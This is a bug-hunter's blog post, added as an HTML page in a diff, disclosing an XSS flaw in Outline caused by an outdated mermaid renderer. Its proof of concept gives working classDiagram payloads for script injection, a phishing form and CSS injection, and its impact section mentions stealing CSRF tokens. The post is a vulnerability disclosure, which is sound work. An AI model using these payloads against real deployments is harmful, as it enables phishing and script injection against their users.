@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>XSS in Outline when rendering mermaid diagrams | sunriseXu’s bug hunting journey</title>
+<meta name="generator" content="Jekyll v4.3.3" />
+<meta property="og:title" content="XSS in Outline when rendering mermaid diagrams" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram." />
+<meta property="og:description" content="Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram." />
+<link rel="canonical" href="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" />
+<meta property="og:url" content="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" />
+<meta property="og:site_name" content="sunriseXu’s bug hunting journey" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-02T10:31:06+08:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="XSS in Outline when rendering mermaid diagrams" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-06-02T10:31:06+08:00","datePublished":"2024-06-02T10:31:06+08:00","description":"Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.","headline":"XSS in Outline when rendering mermaid diagrams","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"},"url":"http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="sunriseXu&apos;s bug hunting journey" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">sunriseXu&#39;s bug hunting journey</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">XSS in Outline when rendering mermaid diagrams</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2024-06-02T10:31:06+08:00" itemprop="datePublished">Jun 2, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <h3 id="summary">Summary</h3>
+<p>Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.</p>
+
+<h3 id="details">Details</h3>
+<p>Outline is using <a href="https://github.com/outline/outline/blob/cb0f03d69820d9cd3422252cb511c7dfeed61904/package.json#L151">mermaid 9.3.0</a> to render mermaid diagram. However, <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">this issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>
+
+<h3 id="poc">PoC</h3>
+
+<ol>
+  <li>Use <code class="language-plaintext highlighter-rouge">/Mermaid Diagram</code> to insert following xss payload:</li>
+</ol>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  classDiagram
+  Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
+  Class03 *-- Class04
+  Class05 o-- Class06
+  Class07 .. Class08
+  Class01 : size()
+  Class01 : int chimp
+  Class01 : int gorilla
+</code></pre></div></div>
+<ol>
+  <li>
+    <p>Open chrome devtools, you can see CSP is blocking the XSSfrom executing.</p>
+
+    <p><img width="762" alt="outline-xss" src="https://github.com/outline/outline/assets/33363160/360801a9-0964-46f2-9244-5b2d4466da72" />
+ <img width="647" alt="outline-xss2" src="https://github.com/outline/outline/assets/33363160/519f4340-187a-401f-a2be-356b8d6e1513" /></p>
+  </li>
+  <li>
+    <p>Use following paylod to inject forms for phishing:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
+ Class01 &lt;|-- `&lt;form action='https://google.com'&gt;&lt;label for='fname'&gt;First name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='fname' name='fname' value='John'&gt;&lt;br&gt;&lt;label for='lname'&gt;Last name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='lname' name='lname' value='Doe'&gt;&lt;br&gt;&lt;br&gt;&lt;input type='submit' value='Submit'&gt;&lt;/form&gt;`
+</code></pre></div>    </div>
+
+    <p><img width="672" alt="xss-phishing" src="https://github.com/outline/outline/assets/33363160/4e495246-59bf-44b3-a41d-eb9459cb2a69" /></p>
+  </li>
+  <li>
+    <p>Use following to inject css styles:</p>
+
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
+ Class01 &lt;|-- `&lt;h1&gt;inject styles&lt;/h1&gt;&lt;style&gt;div{color:red!important;font-size:22px;}&lt;/style&gt;`
+ Class01 : int gorilla
+</code></pre></div>    </div>
+    <p><img width="648" alt="css-injection" src="https://github.com/outline/outline/assets/33363160/928803ff-e90b-4d64-8180-0a50e688fc87" /></p>
+  </li>
+  <li>
+    <p>The poc can be found in <a href="https://sunflowers101.getoutline.com/s/1784c475-adf0-427e-9231-377b6bec6140">this page</a>.</p>
+  </li>
+</ol>
+
+<h3 id="impact">Impact</h3>
+
+<p>In official outline page, the XSS is blocked by CSP, but attacker can still inject html payload to phishing, or using css injection to get csrf token. Besides, if self-host outline is not configured with CSP, the XSS will be triggered.</p>
+
+<h3 id="reference">Reference</h3>
+
+<p><a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
+
+<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>
+
+
+  </div><a class="u-url" href="/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">sunriseXu&#39;s bug hunting journey</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">sunriseXu&#39;s bug hunting journey</li><li><a class="u-email" href="mailto:github@example.com">github@example.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>sunriseXu&#39;s bug hunting journey, sharing new findings of bug hunting.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
